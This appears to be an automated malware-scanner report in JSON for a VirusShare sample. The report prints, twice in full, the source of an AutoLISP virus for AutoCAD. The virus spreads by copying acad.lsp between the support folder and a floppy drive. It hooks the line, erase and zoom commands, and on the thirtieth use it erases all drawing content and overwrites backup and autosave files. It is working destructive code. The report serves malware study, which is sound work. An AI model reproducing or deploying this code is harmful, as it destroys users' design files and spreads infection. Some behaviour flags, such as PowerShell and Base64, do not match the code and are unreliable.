{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "command": "May run PowerShell commands",
            "open": "May open a file",
            "write": "May write to a file"
        },
        "macro": "(setvar \"cmdecho\" 0)\n(defun copyy (origen destino / file1 file2 esc1)\n  (if (= FIC \"A\")\t\t\t\t\t\n    (progn\n     (setq file1 (open origen \"r\") file2 (open destino \"w\"))\n     (if (and (/= file2 nil) (/= file1 nil))\n      (progn\n       (while\n        (setq esc1 (read-line file1))\n        (write-line esc1 file2)\n       )\n       (close file1)\n       (close file2)))))\n)\n(defun ejecuta (/ tabla aux text1 text2 archi arch1)\n  (command \"style\" \"txt\" \"txt\" 0 1 0 \"\" \"\" \"\")\n  (setq nombre (strcat (getvar \"dwgprefix\") (getvar \"dwgname\")) otron (getvar \"tempprefix\"))\n  (if (/= nombre nil)\n  (setq COD96-I (strcat (substr nombre 1 (- (strlen nombre) 3)) \"bak\")))\n  (setq tabla (tblnext \"layer\" 1) aux (cdr (assoc 2 tabla)))\n  (command \"layer\" \"ON\" \"0\" \"T\" \"0\" \"U\" \"0\" \"\")\n  (while (/= (setq tabla (tblnext \"layer\")) nil)\n    (setq aux (cdr (assoc 2 tabla)))\n    (command \"layer\" \"ON\" aux \"T\" aux \"U\" aux \"\"))\n  (command \"erase\" \"all\" \"\");;;;;ja ja ja ja\n  (setq text1 \"Universidad Nacional de Ingenier\ufffda\" text2 \"ExTaCiS_CAD Ver. 1.9.2\")\n  (command \"color\" 1)\n  (command \"text\" \"j\" \"m\" '(0 100) 5 0 text1 \"\")\n  (command \"text\" \"j\" \"m\" '(0 90) 5 0 text2 \"\")\n  (command \"zoom\" \"e\")\n  (command \"qsave\")\n  (setq nombres '() jj 1 autofile (getvar \"savefile\") num1 (strlen autofile) cco 1 archiv_nom \"\")\n  (while (/= \".\" (setq tte (substr autofile cco 1)))\n    (setq archiv_nom (strcat archiv_nom tte) cco (1+ cco))\n  )\n  (setq archiv_ext (substr autofile (1+ cco)) otron (strcat otron archiv_nom))\n  (while (open (setq otron1 (strcat otron (itoa jj) (strcat \".\" archiv_ext))) \"r\")\n    (setq nombres (cons otron1 nombres) jj (1+ jj))\n  )\n  (setq jj 1)\n  (while (open (setq otron1 (strcat otron (itoa jj) \".bak\")) \"r\")\n    (setq nombres (cons otron1 nombres) jj (1+ jj))\n  )\n  (setq nombres (cons COD96-I nombres) jj 0)\n  (repeat (length nombres)\n    (if (setq archi (open (nth jj nombres) \"w\"))\n      (progn\n        (write-line text1 archi)\n        (write-line text2 archi)\n        (close archi)\n        (setq jj (1+ jj))\n      )\n      (setq jj (1+ jj))\n    )\n  )\n  (command \"quit\")\n)\n(setq des \"a:\\\\acad.lsp\" nombre (strcat (getvar \"dwgprefix\") (getvar \"dwgname\")))\n(setq m11 \"acad.lsp\" contador_de_la_muerte 0 cadena (getvar \"acadprefix\") num (strlen cadena) j 1 k 0 nucleo \"\")\n(if (/= nombre nil)\n  (setq FIC (substr nombre 1 1)))\n(while (= k 0)\n  (setq char (substr cadena j 1) j (1+ j))\n  (if (/= char \";\")\n    (setq nucleo (strcat nucleo char))\n    (setq k 1)))\n(setq m22 (findfile m11) unidad (substr m22 1 1) m3 (strcat nucleo \"\\\\\" m11))\n(if (= unidad \"A\")\n  (copyy m22 m3)\n  (copyy m3 des))\n(defun c:l ()\n  (setq contador_de_la_muerte (1+ contador_de_la_muerte))\n  (if (= contador_de_la_muerte 30)\n    (ejecuta))\n  (command \".line\"))\n(defun c:e ()\n  (setq contador_de_la_muerte (1+ contador_de_la_muerte))\n  (if (= contador_de_la_muerte 30)\n    (ejecuta))\n  (command \".erase\"))\n(defun c:z ()\n  (setq contador_de_la_muerte (1+ contador_de_la_muerte))\n  (if (= contador_de_la_muerte 30)\n    (ejecuta))\n  (command \".zoom\"))\n;;comentarios y/o sugerencias a traemelo@lanet.com.pe\n;;y el que me borbardee.... hay,hay,hay....pobresito.\n;;Ya sale para AutoCAD 2000.\n;;Por la culpa de unos idiotas tube que cambiar de acadr14.lsp a acad.lsp\n;;Actualizado al 15/05/2000 a las 12:59 AM\n;;....\ufffd\ufffd\ufffdhay hoy tengo pr\ufffdctica...y no he estudiado nada!!!"
    },
    "filename": "VirusShare_230ad0b6b975ebe90918dfbfd13c8872",
    "filesize": 3417,
    "filetype": "Lisp/Scheme program, ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "230ad0b6b975ebe90918dfbfd13c8872",
        "sha1": "6484ec9b41a39421f867b6843247492fcba5ac23",
        "sha256": "5257414528aa622f4e02b39862b9712d72786a6a7525251d5c7bdad932e211bf"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "(setvar \"cmdecho\" 0)",
            "(defun copyy (origen destino / file1 file2 esc1)",
            "  (if (= FIC \"A\")\t\t\t\t\t",
            "    (progn",
            "     (setq file1 (open origen \"r\") file2 (open destino \"w\"))",
            "     (if (and (/= file2 nil) (/= file1 nil))",
            "      (progn",
            "       (while",
            "        (setq esc1 (read-line file1))",
            "        (write-line esc1 file2)",
            "       )",
            "       (close file1)",
            "       (close file2)))))",
            "(defun ejecuta (/ tabla aux text1 text2 archi arch1)",
            "  (command \"style\" \"txt\" \"txt\" 0 1 0 \"\" \"\" \"\")",
            "  (setq nombre (strcat (getvar \"dwgprefix\") (getvar \"dwgname\")) otron (getvar \"tempprefix\"))",
            "  (if (/= nombre nil)",
            "  (setq COD96-I (strcat (substr nombre 1 (- (strlen nombre) 3)) \"bak\")))",
            "  (setq tabla (tblnext \"layer\" 1) aux (cdr (assoc 2 tabla)))",
            "  (command \"layer\" \"ON\" \"0\" \"T\" \"0\" \"U\" \"0\" \"\")",
            "  (while (/= (setq tabla (tblnext \"layer\")) nil)",
            "    (setq aux (cdr (assoc 2 tabla)))",
            "    (command \"layer\" \"ON\" aux \"T\" aux \"U\" aux \"\"))",
            "  (command \"erase\" \"all\" \"\");;;;;ja ja ja ja",
            "  (setq text1 \"Universidad Nacional de Ingeniera\" text2 \"ExTaCiS_CAD Ver. 1.9.2\")",
            "  (command \"color\" 1)",
            "  (command \"text\" \"j\" \"m\" '(0 100) 5 0 text1 \"\")",
            "  (command \"text\" \"j\" \"m\" '(0 90) 5 0 text2 \"\")",
            "  (command \"zoom\" \"e\")",
            "  (command \"qsave\")",
            "  (setq nombres '() jj 1 autofile (getvar \"savefile\") num1 (strlen autofile) cco 1 archiv_nom \"\")",
            "  (while (/= \".\" (setq tte (substr autofile cco 1)))",
            "    (setq archiv_nom (strcat archiv_nom tte) cco (1+ cco))",
            "  (setq archiv_ext (substr autofile (1+ cco)) otron (strcat otron archiv_nom))",
            "  (while (open (setq otron1 (strcat otron (itoa jj) (strcat \".\" archiv_ext))) \"r\")",
            "    (setq nombres (cons otron1 nombres) jj (1+ jj))",
            "  (setq jj 1)",
            "  (while (open (setq otron1 (strcat otron (itoa jj) \".bak\")) \"r\")",
            "    (setq nombres (cons otron1 nombres) jj (1+ jj))",
            "  (setq nombres (cons COD96-I nombres) jj 0)",
            "  (repeat (length nombres)",
            "    (if (setq archi (open (nth jj nombres) \"w\"))",
            "      (progn",
            "        (write-line text1 archi)",
            "        (write-line text2 archi)",
            "        (close archi)",
            "        (setq jj (1+ jj))",
            "      )",
            "      (setq jj (1+ jj))",
            "    )",
            "  (command \"quit\")",
            "(setq des \"a:\\\\acad.lsp\" nombre (strcat (getvar \"dwgprefix\") (getvar \"dwgname\")))",
            "(setq m11 \"acad.lsp\" contador_de_la_muerte 0 cadena (getvar \"acadprefix\") num (strlen cadena) j 1 k 0 nucleo \"\")",
            "(if (/= nombre nil)",
            "  (setq FIC (substr nombre 1 1)))",
            "(while (= k 0)",
            "  (setq char (substr cadena j 1) j (1+ j))",
            "  (if (/= char \";\")",
            "    (setq nucleo (strcat nucleo char))",
            "    (setq k 1)))",
            "(setq m22 (findfile m11) unidad (substr m22 1 1) m3 (strcat nucleo \"\\\\\" m11))",
            "(if (= unidad \"A\")",
            "  (copyy m22 m3)",
            "  (copyy m3 des))",
            "(defun c:l ()",
            "  (setq contador_de_la_muerte (1+ contador_de_la_muerte))",
            "  (if (= contador_de_la_muerte 30)",
            "    (ejecuta))",
            "  (command \".line\"))",
            "(defun c:e ()",
            "  (setq contador_de_la_muerte (1+ contador_de_la_muerte))",
            "  (if (= contador_de_la_muerte 30)",
            "    (ejecuta))",
            "  (command \".erase\"))",
            "(defun c:z ()",
            "  (setq contador_de_la_muerte (1+ contador_de_la_muerte))",
            "  (if (= contador_de_la_muerte 30)",
            "    (ejecuta))",
            "  (command \".zoom\"))",
            ";;comentarios y/o sugerencias a traemelo@lanet.com.pe",
            ";;y el que me borbardee.... hay,hay,hay....pobresito.",
            ";;Ya sale para AutoCAD 2000.",
            ";;Por la culpa de unos idiotas tube que cambiar de acadr14.lsp a acad.lsp",
            ";;Actualizado al 15/05/2000 a las 12:59 AM",
            ";;....hay hoy tengo prctica...y no he estudiado nada!!!"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.295203",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
